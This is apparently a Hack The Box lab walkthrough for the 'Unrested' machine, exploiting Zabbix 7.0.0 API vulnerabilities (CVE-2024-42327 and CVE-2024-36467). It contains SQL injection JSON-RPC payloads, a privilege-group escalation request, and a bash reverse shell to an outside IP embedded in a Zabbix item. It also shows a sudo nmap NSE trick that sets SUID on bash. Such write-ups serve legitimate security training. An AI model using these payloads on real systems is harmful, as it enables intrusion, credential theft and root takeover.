# Unrested HTB Walkthrough

[![Hack The Box](https://img.shields.io/badge/HackTheBox-Unrested-yellow?logo=hackthebox)](https://app.hackthebox.com/machines/639)
[![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow)](https://github.com/subhash00/HackTheBox/)
[![Platform: Linux](https://img.shields.io/badge/Platform-Linux-blue)](https://github.com/subhash00/HackTheBox/)
[![Topic: Linux-PrivEsc](https://img.shields.io/badge/Topic-Linux--PrivEsc-yellowgreen)](https://en.wikipedia.org/wiki/Privilege_escalation)

## Overview
This walkthrough documents the process of solving the Unrested machine on Hack The Box. Unrested is a medium difficulty Linux machine running Zabbix 7.0.0, which is vulnerable to multiple security flaws including API privilege escalation, SQL injection, and sudo misconfigurations. The exploitation leverages CVE-2024-36467 and CVE-2024-42327 affecting the Zabbix JSON-RPC API and a sudo misconfiguration allowing root access via running Nmap with specific options.

The goal is to enumerate the machine, exploit the vulnerable API endpoints to gain user access, extract credentials from the database via SQLi, and finally escalate privileges with a clever Nmap-based exploit.

---

## Table of Contents
- [Enumeration](#enumeration)
- [API Exploitation](#api-exploitation)
- [Reverse Shell Setup](#reverse-shell-setup)
- [Privilege Escalation via Nmap](#privilege-escalation-via-nmap)
- [Root Shell and Flag](#root-shell-and-flag)
- [Stepwise PoC](#stepwise-poc)
- [Tools Used](#tools-used)
- [Technologies Used](#technologies-used)

---

## Enumeration


**Scan all TCP ports quickly**
```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.231.176 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```
**Detailed service/version scan on discovered ports**
```
nmap -p$ports -sC -sV 10.129.231.176
```

---

## API Exploitation

### Vulnerable Zabbix API Endpoint
- API Endpoint: `http://<ip>/zabbix/api_jsonrpc.php`
- Vulnerable methods: `user.get`, `host.get`, `user.login`, `item.create`, `user.update`
- Reference:
  ```
  https://support.zabbix.com/browse/ZBX-25623
  https://github.com/zabbix/zabbix
  https://github.com/compr00t/CVE-2024-42327?tab=readme-ov-file
  https://nvd.nist.gov/vuln/detail/CVE-2024-42327
  ```

---

### SQL Injection and Database Extraction
- Create **access token** using 'user.login' method.
- Leverage user.update to add users to privilege groups.
- Use SQL injection to extract session IDs and sensitive data using time-based or error-based payloads on API parameters.
- Example payload for tables enumeration and SQL identification:
```
roleid","name AND (SELECT 1 FROM (SELECT SLEEP(5))A)"]

##After adding user to privilege groups.
roleid, @@version
roleid, (SELECT GROUP_CONCAT(table_name SEPARATOR '\n') FROM information_schema.tables LIMIT 1)
```
---

### Example: Time base SQL Injection 
```
{
  "jsonrpc": "2.0",
  "method": "user.get",
  "params": {"output":
["userid","username"],"selectRole":["roleid","name AND (SELECT 1 FROM (SELECT SLEEP(5))A)"],"editable":1},
  "id": 1,
  "auth": "171377d99af202a822d842c0039639d5"
}

```
---

###  Leverage user.update to add our user to privilege group. 
```
{"jsonrpc": "2.0", "method": "user.update", "params": {"userid": "3", "usrgrps": [{"usrgrpid":"7"},{"usrgrpid":"13"}]},
"auth":"bed8160dd79972adb7a870fa758c7710",
 "id": 1,
 "auth": "171377d99af202a822d842c0039639d5"
}
```

---

### Enumerate columns in sessions table (SQLi)
```
{
"jsonrpc": "2.0",
"method": "user.get",
"params": {
"selectRole": [
"roleid",
"(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='sessions')"
],
"userids": ["1"]
},
"auth": "a",
"id": 1
}
```

---

### Get `hostid` and `interfaceid` required to create items
```
{
"jsonrpc": "2.0",
"method": "host.get",
"params": {
"output": ["hostid"],
"selectHostGroups": "extend",
"selectInterfaces": ["interfaceid"]
},
"auth": "a",
"id": 1
}
```

---

## Reverse Shell Setup

### Netcat listener on attacker's machine
```
nc -lvvp 4448
```

### Create malicious item with reverse shell payload in Zabbix
**Note: hostid and interfaceid are copied from response of host.get method call**
```
{
"jsonrpc": "2.0",
"method": "item.create",
"params": {
"name": "Reverse Shell",
"key_": "system.run[bash -c 'bash -i >& /dev/tcp/10.10.14.99/4545 0>&1']",
"hostid": "10084",
"type": 0,
"value_type": 4,
"interfaceid": "1",
"delay": "60s"
},
"auth": "1054172ff39264342a5a1d3f6be60f11",
"id": 1
}
```

---

## Privilege Escalation via Nmap

### Check sudo privileges of current user
```
sudo -l
```
Output shows user can run `/usr/bin/nmap` as root without password.

### Create NSE Lua script to escalate privileges
```
echo 'os.execute("chmod 4755 /bin/bash")' > /tmp/nse_main.lua
```

### Run Nmap with custom data directory to use our script
```
sudo /usr/bin/nmap --datadir=/tmp -sC localhost
```

### Spawn a root shell using SUID bash
```
/bin/bash -p
id # Verify root privileges
```

---

## 11. Stepwise PoC

<details>
<summary>💻<strong>(click to expand)</strong> </summary>
<img width="1473" height="645" alt="19" src="https://github.com/user-attachments/assets/d585960a-76d5-491c-a8b9-47cf0b53046a" />
<img width="1495" height="702" alt="18" src="https://github.com/user-attachments/assets/890dd080-954a-4207-943a-3b19c3f6c076" />
<img width="1907" height="762" alt="17" src="https://github.com/user-attachments/assets/049a72b2-0e51-49de-9404-b8ed350d92a0" />
<img width="1914" height="802" alt="16" src="https://github.com/user-attachments/assets/52ac97bb-c2cd-40a1-8840-7e3dea7f0114" />
<img width="1916" height="759" alt="15" src="https://github.com/user-attachments/assets/b21350ef-81ee-41c1-ba37-081507eb697c" />
<img width="1094" height="843" alt="14" src="https://github.com/user-attachments/assets/b319d7e0-aeea-4c6c-8c9c-42ed76a77cf8" />
<img width="1051" height="826" alt="13" src="https://github.com/user-attachments/assets/8f9e1084-a79f-48d3-b08a-49c00529c4e8" />
<img width="1839" height="545" alt="12" src="https://github.com/user-attachments/assets/017f96e0-4361-492d-b227-0d958fd028cd" />
<img width="1920" height="619" alt="11" src="https://github.com/user-attachments/assets/7edb7f74-5526-4174-ae6a-1359380ea80b" />
<img width="1868" height="519" alt="10" src="https://github.com/user-attachments/assets/3dd220d5-5070-4cef-ab23-6f86cad931ad" />
<img width="1831" height="635" alt="9" src="https://github.com/user-attachments/assets/8f8aaf51-2669-4c64-ad3c-ab63826df8e9" />
<img width="1920" height="680" alt="8" src="https://github.com/user-attachments/assets/51d745fe-9e2b-46f1-89e6-4df7ea92876b" />
<img width="1907" height="676" alt="7" src="https://github.com/user-attachments/assets/0b61d3a3-8fb0-4412-93e8-7d1841d38520" />
<img width="1915" height="687" alt="6" src="https://github.com/user-attachments/assets/f083baa0-85c8-4da0-9422-a38b824d0296" />
<img width="1798" height="496" alt="5" src="https://github.com/user-attachments/assets/ab11c80e-f223-4e68-aeeb-76c84b78a406" />
<img width="944" height="241" alt="4" src="https://github.com/user-attachments/assets/88845044-48ed-4eba-a50a-f185ceacd535" />
<img width="1526" height="498" alt="3" src="https://github.com/user-attachments/assets/040f6443-3bec-4be5-ad75-7ef221305146" />
<img width="941" height="221" alt="2" src="https://github.com/user-attachments/assets/2b1db28b-e7c6-4df7-97d9-365e26533b3e" />
<img width="1294" height="403" alt="1" src="https://github.com/user-attachments/assets/7903ef0c-f7ec-4c2f-8eb0-90643ffb132c" />

</details>

---

## Tools Used

- **Nmap**: Network scanning and service enumeration tool. Also used here with NSE scripting for privilege escalation.
- **Curl**: Command-line HTTP client used to interact with Zabbix API.
- **Netcat (nc)**: Used to setup a listener to catch reverse shell connections.
- **Base64**: Used to encode/decode exploit scripts.
- **Bash**: Shell interpreter for running commands and scripts.

---

## Technologies Used

- **Zabbix 7.0.0**: Open source network monitoring software, vulnerable here via its API and misconfigured sudo permissions.
- **Lua**: Lightweight scripting language used to write NSE scripts for Nmap.
- **SQL Injection**: Exploiting improper input sanitization in API parameters to perform unauthorized data extraction.
- **SUID (Set User ID)**: Unix file permission that allows executables to run with the owner’s privileges, enabling privilege escalation.

---
